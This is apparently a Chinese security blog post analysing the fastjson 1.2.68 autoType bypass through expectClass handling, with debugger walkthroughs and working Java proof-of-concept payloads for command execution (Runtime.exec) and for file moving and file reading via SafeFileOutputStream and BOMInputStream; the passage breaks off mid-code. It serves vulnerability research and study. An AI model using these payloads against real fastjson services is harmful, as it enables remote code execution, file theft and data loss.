  
  
  <entry>
    <title>fastjson-1.2.68-bypass</title>
    <link href="/2025/03/28/fastjson-1-2-68-bypass/"/>
    <url>/2025/03/28/fastjson-1-2-68-bypass/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="fastjson-1-2-68-绕过"><a href="#fastjson-1-2-68-绕过" class="headerlink" title="fastjson-1.2.68 绕过"></a>fastjson-1.2.68 绕过</h1><p>在 1.2.47 的利用 mappings 缓存恶意类绕过 autoType 修复后，fastjson 又陆续爆出来了一些黑名单的绕过方式。直到 1.2.68 又有了新的思路去绕过 autoType</p><h2 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h2><p>我们先来看看 fastjson1.2.68 又引入了哪些安全机制</p><p>1.2.68 引入了一个新的安全机制 <strong>safeMode</strong> ，在 checkAutoType()的 1238-1245 行 检测到 safemode 开启的话，直接抛出异常</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323141729168.png" alt="image-20250323141729168"></p><p>所以我们只有关闭 safeMode 的情况下才能进行攻击。</p><p>同时在 1251-1267 行 对 expectClass 的类型进行限制 需要是不是 Object Serializable Cloneable Closeable EventListener Iterable Collection 这些类及其子类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324120757520.png" alt="image-20250324120757520"></p><p>另外在 1411-1416 行 还对 JNDI 的一些危险类做了判断 clazz 不能是 ClassLoader，DataSource，RowSet 的子类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324123233834.png" alt="image-20250324123233834"></p><h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们先来看 checkAutoType() z 在哪里能返回类</p><p>但是我们发现在 1326-1338 行 会来到一处可以返回类的代码</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324143639179.png" alt="image-20250324143639179"></p><p> 满足 clazz 不为空，expectClass 为空，或 clazz 是 hashmap 的子类 或 clazz 是 expectClass 的子类， 我们就可以返回 clazz 从而绕过 checkAutoType 的判断，这里还是表宽松的</p><p>我们接着看</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324143320508.png" alt="image-20250324143320508"></p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>我们可不可以第一次在 mappings 缓存白名单中找一个可以利用的 deserializer （<span style="color:#FF8000;"> 因为 json 解析的入口就是 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 方法，而他的 checkAutoType()方法，默认 exceptClass 传递的值是 null ）</span> ，而这个 deserializer 调用 checkAutoType 时，可以给定可控的 或者 是可利用的 expectClass 参数呢? 从而使得 expectClassFlag 为 true ，让恶意类加载后返回。</p><p>我们接着往下看</p><p>我们能要去寻找调用 chackAutoType 的方法中传入 expcetClass 参数不为空的方法，我们查找用法就只有 <code>JavaBeanDeserializer</code> 和 <code>ThrowableDeserializer</code> 方法中的调用符合条件</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324124027724.png" alt="image-20250324124027724"></p><h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>我们进入 com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze 方法 看到有这样一段逻辑</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324124902599.png" alt="image-20250324124902599"></p><p>exClassName 为@type 标签的字符串值 ，把 Throwable 作为 expectClass(期望类) 传给 checkAutoType 了 并把类赋给了 exClass 变量</p><p>绕过 checkAutoType 以后，ThrowableDeserializer#deserialze 就会跟进 exClass 创建异常类了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324130452004.png" alt="image-20250324130452004"></p><blockquote><p>但是由于 mappings 的白名单缓存表里没有 Throwable.class 有的是 Exception.class , 我们不能是继承 Throwable 的类，而要继承 Exception 因为 Exception 是 Throwable 的子类，也符合我们 checkAutoType()的绕过分析</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324131413497.png" alt="image-20250324131413497" style="zoom:50%;" /></blockquote><p>到这里我们已经知道 ThrowableDeserializer#deserialze 是可以利用的，那我们怎么样才能让他自动调用呢？</p><p>在执行完 DefaultJSONParser#parseObject 的 checkAutoType 后会有一段逻辑，是根据 clazz 获取对应的 deserializer </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324135927549.png" alt="image-20250324135927549"></p><p>而在 config.getDeserializer(clazz)中 判断改类是不是 Throwable 的子类，是就创建 ThrowableDeserializer 并返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324140326609.png" alt="image-20250324140326609"></p><p>返回后再去调用 Throwable#deserialze 方法</p><p>到这里，我们就把这个调用链理清了</p><p>我们可以测试一下这个流程</p><p><strong>准备 evilException 类，继承 Exception</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilException</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>bypass68</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass68</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.lingx5.entry.evilException\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来调试一下，看看执行顺序</p><p><strong>第一次 checkAutoType</strong></p><p>在 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 中 </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324145944376.png" alt="image-20250324145944376"></p><p>我们跟进去</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324150453141.png" alt="image-20250324150453141"></p><p>所以 checkAutoType 返回了 java.lang.Exception</p><p>DefaultJSONParser#parseObject 继续往下执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324150833721.png" alt="image-20250324150833721"></p><p>跟进就来到了 <code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code> 方法</p><p><strong>第二次 checkAutoType</strong></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151627072.png" alt="image-20250324151627072"></p><p>跟进 checkAutoType</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151548537.png" alt="image-20250324151548537"></p><p>返回后在 ThrowableDeserializer#deserialze 中实例化</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151811994.png" alt="image-20250324151811994"></p><p>命令执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151833487.png" alt="image-20250324151833487"></p><h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h3><p>其实 javaBeanDeserializer 的方式，和上面 Throwable 的思路基本上是一致的，都是利用期望类来绕过，不过这次利用的 AutoCloseable 这个接口</p><p>在 JavaBeanDeserializer#deserialze 中的 checkAutoType 是这样传参数的，其中 expectClass 是跟 type 的值来获取的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328130449037.png" alt="image-20250328130449037"></p><p>我们看 type 是怎么来的，发现是参数传进来的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325094620038.png" alt="image-20250325094620038"></p><p>而在 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) 方法中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325094507581.png" alt="image-20250325094507581"></p><p>所以利用基本上就一致了</p><p>我们写一个恶意类 , 实现 AutoCloseable 接口</p><p><strong>evilAutoCloseable</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    String cmd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>AutoCloseableBypass68</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoCloseableBypass68</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.lingx5.entry.evilAutoCloseable\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;cmd\&quot;:\&quot;calc\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325095946017.png" alt="image-20250325095946017"></p><p>我们调试一下，看看是不是跟我们预想的一样</p><p>第一次 checkAutoType 返回 interface java.lang.AutoCloseable 类</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100337951.png" alt="image-20250325100337951"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100422623.png" alt="image-20250325100422623"></p><p>接着执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100752870.png" alt="image-20250325100752870"></p><p>我们步入</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101102689.png" alt="image-20250325101102689"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101250512.png" alt="image-20250325101250512"></p><p>再接着就是反序列化 json 串，执行 setter 方法了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101458444.png" alt="image-20250325101458444"></p><h2 id="AutoCloseable-的一些应用"><a href="#AutoCloseable-的一些应用" class="headerlink" title="AutoCloseable 的一些应用"></a>AutoCloseable 的一些应用</h2><h3 id="fastjson-特性"><a href="#fastjson-特性" class="headerlink" title="fastjson 特性"></a>fastjson 特性</h3><p><span style="color:#FF0000;"> 这里主要是 fastjson 有一个特性，就是如果没有无参构造器的话，fastjson 会根据 json 字符串，扫描构造参数最多的方法进行初始化，并且不再执行 setter 方法 </span></p><table><thead><tr><th>引用</th><th>描述</th></tr></thead><tbody><tr><td>“$ref “:”..”</td><td>上一级</td></tr><tr><td>“$ref “:”@”</td><td>当前对象，也就是自引用</td></tr><tr><td>“$ref”:”$”</td><td>根对象</td></tr><tr><td>“$ref”:”$.children.0”</td><td>基于路径的引用，相当于 root.getChildren().get(0)</td></tr></tbody></table><p><span style="color:#FF0000;"> $ref特性，本来作者的用意是方便实现  JSON 结构的 <strong>引用</strong> 和 <strong>复用</strong>，简单来说：就是json串里要引用之前定义的对象<code>&#123;&#125;包裹</code>就可以很方便的使用$ ref，我们主要就是可以利用它去主动的调用类的 getter 方法 </span></p><p>这里 OutputStream 和 InputStream 默认是实现了 AutoCloseable 接口的，这里是参考 <a href="https://www.anquanke.com/post/id/232774">mi1k7ea</a> 和 <a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">voidfyoo</a> 师傅文章中的一些文件利用, 拿来复现学习一下</p><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><h4 id="SafeFileOutputStream"><a href="#SafeFileOutputStream" class="headerlink" title="SafeFileOutputStream"></a>SafeFileOutputStream</h4><p>主要还是找到了 <strong>SafeFileOutputStream</strong> 类，它具有移动文件的功能</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们看一下这个类，他有一个构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SafeFileOutputStream</span><span class="hljs-params">(String targetPath, String tempPath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-built_in">this</span>.failed = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.target = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(targetPath);<br>    <span class="hljs-built_in">this</span>.createTempFile(tempPath);<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.target.exists()) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.temp.exists()) &#123;<br>            <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.target));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><span class="hljs-comment">// target不存在，而tmp存在，就可以复制文件到target</span><br>        <span class="hljs-built_in">this</span>.copy(<span class="hljs-built_in">this</span>.temp, <span class="hljs-built_in">this</span>.target);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.temp));<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以利用这个，把系统的一些敏感文件，复制到 web 目录下，来进行进一步的渗透</p><p><strong>copyFile</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">copyFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;tempPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\java\\\\com\\\\lingx5\\\\exp\\\\1.txt\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;targetPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\java\\\\com\\\\lingx5\\\\poc\\\\1.txt\&quot;\n&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们创建一个 1.txt</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325151508025.png" alt="image-20250325151508025"></p><p>运行调试一下，来到了 copy 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152004851.png" alt="image-20250325152004851"></p><p>内部是调用 renameto()方法实现的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152532946.png" alt="image-20250325152532946"></p><blockquote><p>这就意味着这种方式有潜在的危害，他会把文件 <code>移动/重命名</code> 到目标目录，源文件内容会被置空</p></blockquote><p>执行结果</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152814277.png" alt="image-20250325152814277"></p><p><span style="color:#FF0000;"> 所以这种功能还是会对目标机器有一定的危害性，谨慎使用 </span></p><h4 id="BOMInputStream"><a href="#BOMInputStream" class="headerlink" title="BOMInputStream"></a>BOMInputStream</h4><p>这个类同样也继承了 AutoCloseable</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326101128853.png" alt="image-20250326101128853"></p><p>网上公开的 POC 是这个样子的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;x&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,<br>    <span class="hljs-string">&quot;delegate&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,<br>      <span class="hljs-string">&quot;reader&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,<br>        <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;file:///tmp/flag&quot;</span><br>      &#125;,<br>      <span class="hljs-string">&quot;charsetName&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bufferSize&quot;</span>: <span class="hljs-number">1024</span><br>    &#125;,<br>    <span class="hljs-string">&quot;boms&quot;</span>: [&#123;<br>      <span class="hljs-string">&quot;charsetName&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bytes&quot;</span>: [<span class="hljs-number">66</span>]<br>    &#125;]<br>  &#125;,<br>  <span class="hljs-string">&quot;address&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.x.BOM&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先用 BOMInputStream 作为了入口</p><p>看一下他的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BOMInputStream</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputStream delegate, <span class="hljs-keyword">final</span> ByteOrderMark... boms)</span> &#123;<br>    <span class="hljs-built_in">this</span>(delegate, <span class="hljs-literal">false</span>, boms);<br>&#125;<br><span class="hljs-comment">// 重载</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BOMInputStream</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputStream delegate, <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> include, <span class="hljs-keyword">final</span> ByteOrderMark... boms)</span> &#123;<br>    <span class="hljs-built_in">super</span>(delegate);<br>    <span class="hljs-keyword">if</span> (IOUtils.length(boms) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;No BOMs specified&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">this</span>.include = include;<br>    <span class="hljs-keyword">final</span> List&lt;ByteOrderMark&gt; list = Arrays.asList(boms);<br>    <span class="hljs-comment">// Sort the BOMs to match the longest BOM first because some BOMs have the same starting two bytes.</span><br>    list.sort(ByteOrderMarkLengthComparator);<br>    <span class="hljs-built_in">this</span>.boms = list;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ByteOrderMark (字节顺序标记) 是一个位于文本文件或数据流 <strong>开头</strong> 的特殊 Unicode 字符 (<code>U+FEFF</code>)，主要是用来 <strong>标识文本的字节序 (Endianness) 和 编码方式 (Encoding)</strong>。</p></blockquote><p><span style="font-style:italic;"> 这个 boms 数组的传递也是我们攻击的关键，我们这个攻击链实际上就是根据 boms 数组来碰撞出文件的内容的（后面也会详细提到）</span></p><p>我们给 delegate 这个输入流传入的是 ReaderInputStream 调用这个构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ReaderInputStream</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Reader reader, <span class="hljs-keyword">final</span> CharsetEncoder encoder, <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> bufferSize)</span> &#123;<br>    <span class="hljs-built_in">this</span>.reader = reader;<br>    <span class="hljs-built_in">this</span>.encoder = encoder;<br>    <span class="hljs-built_in">this</span>.encoderIn = CharBuffer.allocate(bufferSize);<br>    <span class="hljs-built_in">this</span>.encoderIn.flip();<br>    <span class="hljs-built_in">this</span>.encoderOut = ByteBuffer.allocate(<span class="hljs-number">128</span>);<br>    <span class="hljs-built_in">this</span>.encoderOut.flip();<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是规定了 字节编码和缓冲区大小，而给 Reader 赋值 URLReader 对象，利用 URLReader 支持的伪协议 <code>file://</code> 来打开文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">URLReader</span><span class="hljs-params">(URL url)</span> &#123;<br>    <span class="hljs-built_in">this</span>(url, (Charset)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">URLReader</span><span class="hljs-params">(URL url, Charset cs)</span> &#123;<br>    <span class="hljs-built_in">this</span>.url = (URL)Objects.requireNonNull(url);<br>    <span class="hljs-built_in">this</span>.cs = cs;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里把读取文件要用到的类封装完成了。</p><p>利用$ref 去调用 BOMInputStream 的 getBom 方法 ，我们来看一下这个方法</p><p>in 是我们传递的 ReaderInputStream，再去调 URLReader 的 read() 方法，读取文件，细节就不过多赘述了</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326133546934.png" alt="image-20250326133546934" style="zoom:67%;" /><p>后边的内容，我们通过注释应该也可以知道，就是去对比 firstBytes 和 boms 数组是否匹配</p><h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>我们来执行 POC 看一下</p><p>创建一个 1.txt 文件，内容写了 12</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326140432459.png" alt="image-20250326140432459"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span 